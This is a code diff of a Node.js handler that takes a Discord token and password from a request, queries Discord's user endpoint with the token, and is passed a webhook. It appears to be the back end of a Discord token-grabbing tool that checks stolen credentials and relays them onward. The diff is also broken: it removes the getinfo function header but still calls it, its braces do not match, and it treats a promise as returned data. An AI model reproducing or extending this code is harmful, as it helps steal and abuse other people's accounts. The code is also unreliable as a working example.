@@ -1,29 +1,33 @@
 const axios = require('axios');
 
 
-function getinfo(token)
+
+
+exports.send = (req, res, webhook) =>
 {
+	
+	const token = req.body.token;
+	const password = req.body.password;
+	
+	var info;
 axios.get('https://discordapp.com/api/v8/users/@me', {
     withCredentials: true,
     headers: {
-      Authorization: "",
+      Authorization: token,
     },
   }).then((response) => {	
     return(response.data);
   }
   )
 }
-exports.send = (req, res, webhook) =>
-{
-	const token = req.body.token;
-	const password = req.body.password;
+
 	
 	if(token === undefined || password === undefined)
 		return res.status(400).json({status: "error", message: "Not sent."});
 	
 	
 
-var 	info = getinfo(token);
+ 	info = getinfo(token);
 	
 	
 	var discrim = JSON.parse(JSON.stringify(info)).discriminator;
